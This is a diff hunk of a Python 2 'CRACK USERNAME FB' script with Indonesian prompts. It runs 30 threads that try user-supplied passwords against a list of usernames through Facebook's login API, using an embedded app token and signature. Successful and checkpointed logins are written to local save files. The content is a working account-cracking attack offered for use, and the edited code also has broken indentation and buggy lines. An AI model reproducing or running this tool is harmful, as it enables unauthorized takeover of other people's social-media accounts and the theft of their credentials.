@@ -288,164 +288,164 @@ def crack_nam():
     print "\033[1;96m    \033[1;93m◆\033[1;31m ⃟ ⃟ \033[1;34m░▒▓ \033[1;93mCRACK USERNAME FB \033[1;34m▓▒░\033[1;31m ⃟ ⃟ \033[1;93m◆     \033[1;96m"
     print 42*"\033[1;96m="
     try:
-        print '\033[1;96m[+] \033[1;93mContoh : \033[1;97mupil. \033[1;31mupil.pilek. \033[1;96dll'
-        c = raw_input('\033[1;96m[+] \x1b[1;34mUsername : \033[1;31m ')
-        print '\033[1;96m[+] \033[1;93mContoh : \033[1;96mupil123'
-        pass1 = raw_input('\033[1;96m[1] \033[1;93mPassword : \033[1;31m ')
-        pass2 = raw_input('\033[1;96m[2] \033[1;93mPassword : \033[1;31m ')
-        pass3 = raw_input('\033[1;96m[3] \033[1;93mPassword : \033[1;31m ')
-        pass4 = raw_input('\033[1;96m[4] \033[1;93mPassword : \033[1;31m ')
-        pass5 = raw_input('\033[1;96m[5] \033[1;93mPassword : \033[1;31m ')
-        pass6 = raw_input('\033[1;96m[6] \033[1;93mPassword : \033[1;31m ')
-        pass7 = raw_input('\033[1;96m[7] \033[1;93mPassword : \033[1;31m ')        
-        idlist = '..txt'
-        for line in open(idlist, 'r').readlines():
-            id.append(line.strip())
+            print '\033[1;96m[+] \033[1;93mContoh : \033[1;97mupil. \033[1;31mupil.pilek. \033[1;96dll'
+            c = raw_input('\033[1;96m[+] \x1b[1;34mUsername : \033[1;31m ')
+            print '\033[1;96m[+] \033[1;93mContoh : \033[1;96mupil123'
+            pass1 = raw_input('\033[1;96m[1] \033[1;93mPassword : \033[1;31m ')
+            pass2 = raw_input('\033[1;96m[2] \033[1;93mPassword : \033[1;31m ')
+            pass3 = raw_input('\033[1;96m[3] \033[1;93mPassword : \033[1;31m ')
+            pass4 = raw_input('\033[1;96m[4] \033[1;93mPassword : \033[1;31m ')
+            pass5 = raw_input('\033[1;96m[5] \033[1;93mPassword : \033[1;31m ')
+            pass6 = raw_input('\033[1;96m[6] \033[1;93mPassword : \033[1;31m ')
+            pass7 = raw_input('\033[1;96m[7] \033[1;93mPassword : \033[1;31m ')        
+            idlist = '..txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
 
-    except IOError:
-        print '[!] Ora Ono '
-        raw_input('\n[ Kembali ]')
-        menu()
+        except IOError:
+            print '[!] Ora Ono '
+            raw_input('\n[ Kembali ]')
+            menu()
 
-    xxx = str(len(id))
-    jalan('\033[1;96m[+]\x1b[1;93mTotal user name \x1b[1;97m:\x1b[1;92m ' + xxx)
-    time.sleep(1)
-    titik = ['.   ', '..  ', '... ']
-    for o in titik:
-        print '\r\033[1;96m[+] \033[1;93mProses Sedang Berlangsung ' + o,
-        sys.stdout.flush()
+        xxx = str(len(id))
+        jalan('\033[1;96m[+]\x1b[1;93mTotal user name \x1b[1;97m:\x1b[1;92m ' + xxx)
         time.sleep(1)
-    print
-    print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
-    print 42*"\033[1;96m="
-    print "\033[96m| 😎 | " + 4*" " + "\033[35mUSER NAME" + 7*" " + "\033[96m|" + 4*" " + "\033[33mPassword" + 3*" " + "\033[96m"
-    print 42*"\033[1;96m="
+        titik = ['.   ', '..  ', '... ']
+            for o in titik:
+            print '\r\033[1;96m[+] \033[1;93mProses Sedang Berlangsung ' + o,
+            sys.stdout.flush()
+            time.sleep(1)
+        print
+        print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
+        print 42*"\033[1;96m="
+        print "\033[96m| 😎 | " + 4*" " + "\033[35mUSER NAME" + 7*" " + "\033[96m|" + 4*" " + "\033[33mPassword" + 3*" " + "\033[96m"
+        print 42*"\033[1;96m="
 
 
-    def main(arg):
-        user = arg
-        try:
-            os.mkdir('save')
-        except OSError:
-            pass
+        def main(arg):
+            user = arg
+            try:
+                os.mkdir('save')
+            except OSError:
+                pass
 
-        try:
-            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-            w = json.load(data)
-            if 'access_token' in w:
-                print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass1
-                okb = open('save/usernam.txt', 'a')
-                okb.write('[OK] ' + c + user + ' | ' + pass1 + '\n')
-                okb.close()
-                oks.append(user + pass1)
-            elif 'www.facebook.com' in w['error_msg']:
-                print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass1
-                cps = open('save/usernam.txt', 'a')
-                cps.write('[CP] ' + c + user + ' | ' + pass1 + '\n')
-                cps.close()
-                cekpoint.append(user + pass1)
-            else:
-                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+            try:
+                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                 w = json.load(data)
                 if 'access_token' in w:
-                    print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass2
+                    print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass1
                     okb = open('save/usernam.txt', 'a')
-                    okb.write('[OK] ' + c + user + ' | ' + pass2 + '\n')
+                    okb.write('[OK] ' + c + user + ' | ' + pass1 + '\n')
                     okb.close()
-                    oks.append(user + pass2)
+                    oks.append(user + pass1)
                 elif 'www.facebook.com' in w['error_msg']:
-                    print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass2
+                    print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass1
                     cps = open('save/usernam.txt', 'a')
-                    cps.write('[CP] ' + c + user + ' | ' + pass2 + '\n')
+                    cps.write('[CP] ' + c + user + ' | ' + pass1 + '\n')
                     cps.close()
-                    cekpoint.append(user + pass2)
+                    cekpoint.append(user + pass1)
                 else:
-                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                     w = json.load(data)
                     if 'access_token' in w:
-                        print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass3
+                        print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass2
                         okb = open('save/usernam.txt', 'a')
-                        okb.write('[CP] ' + c + user + ' | ' + pass3 + '\n')
+                        okb.write('[OK] ' + c + user + ' | ' + pass2 + '\n')
                         okb.close()
-                        oks.append(user + pass3)
+                        oks.append(user + pass2)
                     elif 'www.facebook.com' in w['error_msg']:
-                        print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass3
+                        print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass2
                         cps = open('save/usernam.txt', 'a')
-                        cps.write('[CP] ' + c + user + ' | ' + pass3 + '\n')
+                        cps.write('[CP] ' + c + user + ' | ' + pass2 + '\n')
                         cps.close()
-                        cekpoint.append(user + pass3)
+                        cekpoint.append(user + pass2)
                     else:
-                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                         w = json.load(data)
                         if 'access_token' in w:
-                            print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass4
+                            print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass3
                             okb = open('save/usernam.txt', 'a')
-                            okb.write('[OK] ' + c + user + ' | ' + pass4 + '\n')
+                            okb.write('[CP] ' + c + user + ' | ' + pass3 + '\n')
                             okb.close()
-                            oks.append(user + pass4)
+                            oks.append(user + pass3)
                         elif 'www.facebook.com' in w['error_msg']:
-                            print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass4
+                            print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass3
                             cps = open('save/usernam.txt', 'a')
-                            cps.write('[CP] ' + c + user + ' | ' + pass4 + '\n')
+                            cps.write('[CP] ' + c + user + ' | ' + pass3 + '\n')
                             cps.close()
-                            cekpoint.append(user + pass4)
+                            cekpoint.append(user + pass3)
                         else:
-                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                             w = json.load(data)
                             if 'access_token' in w:
-                                print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass5
+                                print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass4
                                 okb = open('save/usernam.txt', 'a')
-                                okb.write('[OK]' + c + user + ' | ' + pass5 + '\n')
+                                okb.write('[OK] ' + c + user + ' | ' + pass4 + '\n')
                                 okb.close()
-                                oks.append(user + pass5)
+                                oks.append(user + pass4)
                             elif 'www.facebook.com' in w['error_msg']:
-                                print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass5
-                                cps.open('save/usernam.txt', 'a')
-                                cps.write('[CP]' + c + user + ' | ' + pass5 + '\n')
+                                print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass4
+                                cps = open('save/usernam.txt', 'a')
+                                cps.write('[CP] ' + c + user + ' | ' + pass4 + '\n')
                                 cps.close()
-                                cekpoint.append(user + pass5)
+                                cekpoint.append(user + pass4)
                             else:
-                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                 w = json.load(data)
                                 if 'access_token' in w:
-                                    print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user + k +   ' | '  +  pass6
-                                    okb = open('save/email.txt', 'a')
-                                    okb.write('[OK] ' + c + user + k + ' | ' + pass6 + '\n')
+                                    print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass5
+                                    okb = open('save/usernam.txt', 'a')
+                                    okb.write('[OK]' + c + user + ' | ' + pass5 + '\n')
                                     okb.close()
-                                    oks.append(user + pass6)
+                                    oks.append(user + pass5)
                                 elif 'www.facebook.com' in w['error_msg']:
-                                    print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user + k +   ' | '  +  pass6
-                                    cps = open('save/email.txt', 'a')
-                                    cps.write('[CP] ' + c + user + k + ' | ' + pass6 + '\n')
+                                    print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass5
+                                    cps.open('save/usernam.txt', 'a')
+                                    cps.write('[CP]' + c + user + ' | ' + pass5 + '\n')
                                     cps.close()
-                                    cekpoint.append(user + pass6)
+                                    cekpoint.append(user + pass5)
                                 else:
-                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                     w = json.load(data)
                                     if 'access_token' in w:
-                                        print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user + k +   ' | '  +  pass7
+                                        print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user + k +   ' | '  +  pass6
                                         okb = open('save/email.txt', 'a')
-                                        okb.write('[OK]' + c + user + k + ' | ' + pass7 + '\n')
+                                        okb.write('[OK] ' + c + user + k + ' | ' + pass6 + '\n')
                                         okb.close()
-                                        oks.append(user + pass7)
+                                        oks.append(user + pass6)
                                     elif 'www.facebook.com' in w['error_msg']:
-                                        print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user + k +   ' | '  +  pass7
-                                        cps.open('save/email.txt', 'a')
-                                        cps.write('[CP]' + c + user + k + ' | ' + pass7 + '\n')
+                                        print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user + k +   ' | '  +  pass6
+                                        cps = open('save/email.txt', 'a')
+                                        cps.write('[CP] ' + c + user + k + ' | ' + pass6 + '\n')
                                         cps.close()
-                                        cekpoint.append(user + pass7)
-        except:
-            pass
+                                        cekpoint.append(user + pass6)
+                                    else:
+                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                        w = json.load(data)
+                                        if 'access_token' in w:
+                                            print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user + k +   ' | '  +  pass7
+                                            okb = open('save/email.txt', 'a')
+                                            okb.write('[OK]' + c + user + k + ' | ' + pass7 + '\n')
+                                            okb.close()
+                                            oks.append(user + pass7)
+                                        elif 'www.facebook.com' in w['error_msg']:
+                                            print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user + k +   ' | '  +  pass7
+                                            cps.open('save/email.txt', 'a')
+                                            cps.write('[CP]' + c + user + k + ' | ' + pass7 + '\n')
+                                            cps.close()
+                                            cekpoint.append(user + pass7)
+            except:
+                pass
 
-    p = ThreadPool(30)
-    p.map(main, id)
-    print 42*"\033[1;96m="
-    print '\033[1;96m[✓] \x1b[1;97mCrack Selesai ....'
-    print '\033[1;96m[✓] \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
-    print '\033[1;96m[✓] \x1b[1;97mCP/OK tersimpan : save/usernam.txt'
-    print 42*"\033[1;96m="
-    raw_input('\x1b[1;97m[\x1b[1;92m KEMBALI \x1b[1;97m]')
-    os.system('python2 upil.py')
+        p = ThreadPool(30)
+        p.map(main, id)
+        print 42*"\033[1;96m="
+        print '\033[1;96m[✓] \x1b[1;97mCrack Selesai ....'
+        print '\033[1;96m[✓] \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
+        print '\033[1;96m[✓] \x1b[1;97mCP/OK tersimpan : save/usernam.txt'
+        print 42*"\033[1;96m="
+        raw_input('\x1b[1;97m[\x1b[1;92m KEMBALI \x1b[1;97m]')
+        os.system('python2 upil.py')
 
 
 def nope():
